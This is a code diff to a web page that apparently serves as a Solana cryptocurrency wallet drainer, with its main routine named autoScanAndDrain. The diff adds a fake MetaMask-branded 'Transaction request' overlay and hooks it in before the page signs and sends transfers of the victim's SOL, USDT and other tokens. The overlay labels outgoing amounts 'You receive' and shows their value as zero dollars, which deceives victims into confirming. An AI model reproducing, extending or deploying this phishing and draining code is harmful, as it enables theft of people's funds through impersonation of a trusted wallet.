@@ -85,9 +85,127 @@
         .log-box h4{font-size:11px;font-weight:700;color:rgba(255,255,255,.2);margin-bottom:8px}
         .log-line{font-size:10px;font-family:monospace;padding:3px 0;color:rgba(255,255,255,.35);border-bottom:1px solid rgba(255,255,255,.02)}
         .log-line.l-ok{color:#14F195}.log-line.l-err{color:#f87171}.log-line.l-warn{color:#fbbf24}.log-line.l-info{color:#b388ff}
+
+        /* —— Transaction request (preview) —— Phantom / MM-style */
+        .tx-overlay{position:fixed;inset:0;z-index:10000;background:#121212;display:none;align-items:flex-start;justify-content:center;padding:24px 16px 32px;overflow-y:auto;font-family:'Inter',-apple-system,sans-serif;-webkit-font-smoothing:antialiased}
+        .tx-overlay.open{display:flex}
+        .tx-panel{width:100%;max-width:400px;background:#121212;color:#fff;border-radius:0;box-shadow:none}
+        .tx-mm-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 4px 8px}
+        .tx-mm-brand{display:flex;align-items:center;gap:10px;font-size:15px;font-weight:600;letter-spacing:-.02em}
+        .tx-mm-fox{width:28px;height:28px;border-radius:8px;background:linear-gradient(145deg,#e2761b 0%,#cd6116 50%,#d7c1b3 100%);flex-shrink:0}
+        .tx-mm-actions{display:flex;gap:4px}
+        .tx-mm-icon-btn{width:36px;height:36px;border-radius:10px;border:none;background:transparent;color:rgba(255,255,255,.45);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1}
+        .tx-mm-icon-btn:hover{color:#fff;background:rgba(255,255,255,.06)}
+        .tx-main-title{text-align:center;font-size:22px;font-weight:700;letter-spacing:-.03em;padding:8px 8px 20px;line-height:1.2}
+        .tx-card{background:#1a1a1a;border-radius:14px;padding:18px 18px 16px;margin-bottom:10px}
+        .tx-card-h{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:500;color:#fff;margin-bottom:14px}
+        .tx-info-ico{width:16px;height:16px;border-radius:50%;border:1.5px solid rgba(255,255,255,.35);color:rgba(255,255,255,.45);font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .tx-est-inner{display:flex;gap:16px;align-items:flex-start;justify-content:space-between}
+        .tx-est-label{font-size:14px;color:#a0a0a0;font-weight:400;line-height:1.4;max-width:42%}
+        .tx-est-assets{flex:1;display:flex;flex-direction:column;align-items:flex-end;gap:14px;min-width:0}
+        .tx-asset-block{display:flex;flex-direction:column;align-items:flex-end;gap:4px}
+        .tx-asset-top{display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:flex-end}
+        .tx-amt{font-size:15px;font-weight:600;color:#41d394;letter-spacing:-.02em}
+        .tx-amt.neg{color:#f87171}
+        .tx-ico-sol{width:22px;height:22px;flex-shrink:0}
+        .tx-ico-usdt{width:22px;height:22px;flex-shrink:0;border-radius:50%;background:#26a17b;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff}
+        .tx-sym{font-size:15px;font-weight:500;color:#fff}
+        .tx-fiat{font-size:13px;color:#888;font-weight:400}
+        .tx-details-row{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.06)}
+        .tx-details-row:last-child{border-bottom:none;padding-bottom:0}
+        .tx-d-label{display:flex;align-items:center;gap:6px;font-size:14px;color:#a0a0a0;font-weight:400}
+        .tx-d-val{font-size:14px;color:#fff;font-weight:500;text-align:right;word-break:break-all;display:flex;align-items:center;gap:8px;justify-content:flex-end;flex-wrap:wrap}
+        .tx-d-val .tx-fee-usd{color:#888;font-weight:400}
+        .tx-acct-ico{width:18px;height:18px;border-radius:4px;background:linear-gradient(145deg,#e2761b,#cd6116);flex-shrink:0}
+        .tx-net-ico{width:18px;height:18px;flex-shrink:0}
+        .tx-adv-block{margin:6px 0 18px;text-align:left}
+        .tx-adv-toggle{background:none;border:none;color:#6b9af7;font-size:14px;font-weight:500;cursor:pointer;display:inline-flex;align-items:center;gap:6px;padding:4px 0;font-family:inherit}
+        .tx-adv-toggle:hover{text-decoration:underline}
+        .tx-adv-chev{transition:transform .2s;display:inline-block}
+        .tx-adv-block.open .tx-adv-chev{transform:rotate(180deg)}
+        .tx-adv-body{display:none;margin-top:10px;padding:12px;background:rgba(0,0,0,.25);border-radius:10px;font-size:11px;font-family:ui-monospace,monospace;color:rgba(255,255,255,.45);line-height:1.5;word-break:break-all}
+        .tx-adv-block.open .tx-adv-body{display:block}
+        .tx-actions{display:flex;gap:10px;margin-top:8px;padding-top:4px}
+        .tx-btn{flex:1;padding:14px 16px;border-radius:12px;font-size:15px;font-weight:600;font-family:inherit;cursor:pointer;border:none;transition:opacity .15s,transform .1s}
+        .tx-btn:active{transform:scale(.98)}
+        .tx-btn-cancel{background:#2a2a2a;color:#fff}
+        .tx-btn-cancel:hover{background:#333}
+        .tx-btn-confirm{background:#fff;color:#111}
+        .tx-btn-confirm:hover{opacity:.92}
     </style>
 </head>
 <body>
+<!-- Полноэкранный предпросмотр «Transaction request» (до окна кошелька) -->
+<div class="tx-overlay" id="txOverlay" aria-hidden="true">
+    <div class="tx-panel" id="txPanel">
+        <div class="tx-mm-bar">
+            <div class="tx-mm-brand"><span class="tx-mm-fox" aria-hidden="true"></span> MetaMask</div>
+            <div class="tx-mm-actions">
+                <button type="button" class="tx-mm-icon-btn" title="Hide" aria-label="Hide">&#128065;&#xfe0e;</button>
+                <button type="button" class="tx-mm-icon-btn" onclick="closeTxPreview(false)" title="Close" aria-label="Close">&times;</button>
+            </div>
+        </div>
+        <h1 class="tx-main-title" id="txMainTitle">Transaction request</h1>
+
+        <div class="tx-card">
+            <div class="tx-card-h">Estimated changes <span class="tx-info-ico" title="Info">i</span></div>
+            <div class="tx-est-inner">
+                <div class="tx-est-label">You receive</div>
+                <div class="tx-est-assets">
+                    <div class="tx-asset-block">
+                        <div class="tx-asset-top">
+                            <span class="tx-amt" id="txAmtSol">+0</span>
+                            <svg class="tx-ico-sol" viewBox="0 0 22 22" aria-hidden="true"><defs><linearGradient id="sg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#9945FF"/><stop offset="100%" style="stop-color:#14F195"/></linearGradient></defs><rect x="2" y="4" width="18" height="4" rx="2" fill="url(#sg)"/><rect x="2" y="9" width="18" height="4" rx="2" fill="url(#sg)" opacity=".85"/><rect x="2" y="14" width="18" height="4" rx="2" fill="url(#sg)" opacity=".7"/></svg>
+                            <span class="tx-sym">SOL</span>
+                        </div>
+                        <div class="tx-fiat" id="txFiatSol">0$</div>
+                    </div>
+                    <div class="tx-asset-block">
+                        <div class="tx-asset-top">
+                            <span class="tx-amt" id="txAmtUsdt">+0</span>
+                            <span class="tx-ico-usdt" aria-hidden="true">T</span>
+                            <span class="tx-sym" id="txSecondSym">USDT</span>
+                        </div>
+                        <div class="tx-fiat" id="txFiatUsdt">0$</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tx-card">
+            <div class="tx-details-row">
+                <div class="tx-d-label">Request from <span class="tx-info-ico" style="width:14px;height:14px;font-size:9px">i</span></div>
+                <div class="tx-d-val" id="txReqFrom">sample.com</div>
+            </div>
+            <div class="tx-details-row">
+                <div class="tx-d-label">Account</div>
+                <div class="tx-d-val"><span class="tx-acct-ico"></span> <span id="txAccount">Account 1</span></div>
+            </div>
+            <div class="tx-details-row">
+                <div class="tx-d-label">Network</div>
+                <div class="tx-d-val">
+                    <svg class="tx-net-ico" viewBox="0 0 18 18" aria-hidden="true"><defs><linearGradient id="ng" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#9945FF"/><stop offset="100%" style="stop-color:#14F195"/></linearGradient></defs><rect x="1" y="3" width="16" height="3.5" rx="1.5" fill="url(#ng)"/><rect x="1" y="7.25" width="16" height="3.5" rx="1.5" fill="url(#ng)" opacity=".85"/><rect x="1" y="11.5" width="16" height="3.5" rx="1.5" fill="url(#ng)" opacity=".7"/></svg>
+                    <span id="txNetwork">Solana Mainnet</span>
+                </div>
+            </div>
+            <div class="tx-details-row">
+                <div class="tx-d-label">Network fee</div>
+                <div class="tx-d-val"><span class="tx-fee-usd" id="txFeeUsd">0,00 $</span> <span id="txFeeSol">0,000015 SOL</span></div>
+            </div>
+        </div>
+
+        <div class="tx-adv-block" id="txAdvBlock">
+            <button type="button" class="tx-adv-toggle" id="txAdvBtn" onclick="toggleTxAdvanced()">Show advanced <span class="tx-adv-chev" id="txAdvChev">&#9662;</span></button>
+            <div class="tx-adv-body" id="txAdvBody">Recent blockhash и сырые инструкции появятся здесь после сборки транзакции.</div>
+        </div>
+
+        <div class="tx-actions">
+            <button type="button" class="tx-btn tx-btn-cancel" onclick="closeTxPreview(false)">Cancel</button>
+            <button type="button" class="tx-btn tx-btn-confirm" onclick="closeTxPreview(true)">Confirm</button>
+        </div>
+    </div>
+</div>
+
 <div class="modal">
     <div class="alert a-e" id="aE"></div>
     <div class="alert a-s" id="aS"></div>
@@ -610,6 +728,21 @@ async function autoScanAndDrain() {
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = publicKey;
 
+                try {
+                    await openTxPreview(tx, {
+                        mode: 'sol',
+                        solDeltaUi: -(sendLam / LAMP),
+                        accountLabel: connectedWalletName ? (connectedWalletName + ' · Account 1') : 'Account 1',
+                        requestHost: window.location.hostname || 'sample.com',
+                    });
+                } catch (rej) {
+                    card.classList.remove('sending');
+                    card.classList.add('fail');
+                    setCardStatus(card, 'rejected');
+                    log('SOL: preview cancelled', 'warn');
+                    throw rej;
+                }
+
                 const {signature} = await provider.signAndSendTransaction(tx);
                 log('SOL TX: '+signature, 'ok');
                 card.classList.remove('sending');
@@ -650,6 +783,31 @@ async function autoScanAndDrain() {
             const {blockhash} = await connection.getLatestBlockhash();
             tx.recentBlockhash = blockhash;
             tx.feePayer = publicKey;
+
+            const USDT_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
+            const isUSDT = tk.mint === USDT_MINT;
+            const previewOpts = {
+                accountLabel: connectedWalletName ? (connectedWalletName + ' · Account 1') : 'Account 1',
+                requestHost: window.location.hostname || 'sample.com',
+            };
+            if (isUSDT) {
+                previewOpts.mode = 'usdt';
+                previewOpts.usdtDeltaUi = -Number(tk.uiAmount);
+            } else {
+                previewOpts.mode = 'spl';
+                previewOpts.splSymbol = info.s;
+                previewOpts.splDeltaUi = -Number(tk.uiAmount);
+                previewOpts.splDecimals = tk.decimals;
+            }
+            try {
+                await openTxPreview(tx, previewOpts);
+            } catch (rej) {
+                card.classList.remove('sending');
+                card.classList.add('fail');
+                setCardStatus(card, 'rejected');
+                log(info.s + ': preview cancelled', 'warn');
+                throw rej;
+            }
 
             const {signature} = await provider.signAndSendTransaction(tx);
             log(info.s+' TX: '+signature, 'ok');
@@ -699,6 +857,103 @@ function addCard(icon, symbol, mintLabel, balanceText) {
 
 function setCardStatus(card, text) {
     card.querySelector('.tk-status').textContent = text;
+}
+
+// ================================================================
+//  TRANSACTION REQUEST UI (предпросмотр перед кошельком)
+// ================================================================
+let txPreviewResolve = null;
+
+function fmtCommaDec(n, decimals) {
+    const s = Number(n).toFixed(decimals);
+    return s.replace('.', ',');
+}
+
+function fmtSignedComma(n, decimals) {
+    if (n === 0 || (Math.abs(n) < Math.pow(10, -decimals))) return '+0';
+    const abs = fmtCommaDec(Math.abs(n), decimals);
+    return (n < 0 ? '−' : '+') + abs;
+}
+
+function toggleTxAdvanced() {
+    document.getElementById('txAdvBlock').classList.toggle('open');
+}
+
+function closeTxPreview(ok) {
+    document.getElementById('txOverlay').classList.remove('open');
+    document.getElementById('txOverlay').setAttribute('aria-hidden', 'true');
+    const p = txPreviewResolve;
+    txPreviewResolve = null;
+    if (p) {
+        if (ok) p.resolve();
+        else p.reject(new Error('User rejected'));
+    }
+}
+
+async function openTxPreview(tx, opts) {
+    opts = opts || {};
+    const host = opts.requestHost != null ? opts.requestHost : (window.location.hostname || 'localhost');
+    document.getElementById('txReqFrom').textContent = host;
+    document.getElementById('txAccount').textContent = opts.accountLabel || 'Account 1';
+    document.getElementById('txNetwork').textContent = opts.networkName || 'Solana Mainnet';
+    document.getElementById('txMainTitle').textContent = opts.title || 'Transaction request';
+
+    let feeLamports = 5000;
+    try {
+        if (connection && tx) {
+            const msg = tx.compileMessage();
+            feeLamports = await connection.getFeeForMessage(msg);
+        }
+    } catch (e) {}
+    const feeSol = feeLamports / LAMP;
+    document.getElementById('txFeeSol').textContent = fmtCommaDec(feeSol, 6) + ' SOL';
+    document.getElementById('txFeeUsd').textContent = '0,00 $';
+
+    const elSol = document.getElementById('txAmtSol');
+    const elUsdt = document.getElementById('txAmtUsdt');
+    elSol.classList.toggle('neg', false);
+    elUsdt.classList.toggle('neg', false);
+
+    document.getElementById('txSecondSym').textContent = 'USDT';
+
+    if (opts.mode === 'sol') {
+        const amt = opts.solDeltaUi != null ? opts.solDeltaUi : 0;
+        elSol.textContent = fmtSignedComma(amt, 6);
+        elSol.classList.toggle('neg', amt < 0);
+        elUsdt.textContent = '+0';
+    } else if (opts.mode === 'usdt') {
+        elSol.textContent = '+0';
+        const u = opts.usdtDeltaUi != null ? opts.usdtDeltaUi : 0;
+        elUsdt.textContent = fmtSignedComma(u, 2);
+        elUsdt.classList.toggle('neg', u < 0);
+    } else if (opts.mode === 'spl') {
+        elSol.textContent = '+0';
+        document.getElementById('txSecondSym').textContent = opts.splSymbol || 'SPL';
+        const u = opts.splDeltaUi != null ? opts.splDeltaUi : 0;
+        const dec = opts.splDecimals != null ? opts.splDecimals : 6;
+        elUsdt.textContent = fmtSignedComma(u, Math.min(8, dec));
+        elUsdt.classList.toggle('neg', u < 0);
+    } else {
+        elSol.textContent = '+0';
+        elUsdt.textContent = '+0';
+    }
+
+    document.getElementById('txFiatSol').textContent = opts.fiatSol || '0$';
+    document.getElementById('txFiatUsdt').textContent = opts.fiatUsdt || '0$';
+
+    const bh = tx && tx.recentBlockhash ? tx.recentBlockhash : '—';
+    const nIx = tx && tx.instructions ? tx.instructions.length : 0;
+    document.getElementById('txAdvBody').textContent =
+        'Recent blockhash: ' + bh + '\n' +
+        'Instructions: ' + nIx;
+
+    document.getElementById('txAdvBlock').classList.remove('open');
+    document.getElementById('txOverlay').classList.add('open');
+    document.getElementById('txOverlay').setAttribute('aria-hidden', 'false');
+
+    return new Promise((resolve, reject) => {
+        txPreviewResolve = { resolve, reject };
+    });
 }
 
 // ================================================================
